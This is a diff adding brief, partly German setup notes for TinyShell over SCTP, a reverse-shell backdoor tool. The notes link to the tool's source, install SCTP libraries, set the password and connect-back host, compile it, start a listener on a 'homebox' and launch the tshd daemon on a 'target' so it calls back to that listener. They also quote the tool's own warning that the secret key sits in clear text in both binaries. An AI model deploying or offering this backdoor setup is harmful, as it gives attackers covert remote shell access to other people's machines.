@@ -1,0 +1,33 @@
+#TinyShell,sctp
+http://insecurety.net/?tag=reverse-shell
+https://github.com/infodox/tsh-sctp
+
+
+#Req. 
+#Check /usr/include/netinet, sctp muss installiert sein
+yum install lksctp-tools-devel lksctp-tools
+
+
+#change pw,connect_back_host and server_port in tsh.h.
+
+
+#compile
+make linux
+
+#start listener in connect back modus
+homebox test # ./tsh cb
+Waiting for the server to connect...
+
+
+#start tshd daemon on target
+target test # ./tshd 
+
+
+
+
+
+Please remember that the secret key is stored in clear inside
+both tsh and tshd executables; therefore you should make sure
+that no one except you has read access to these two files.
+However, you may choose not to store the real (valid) key in
+the client, which will then ask for a password when it starts.
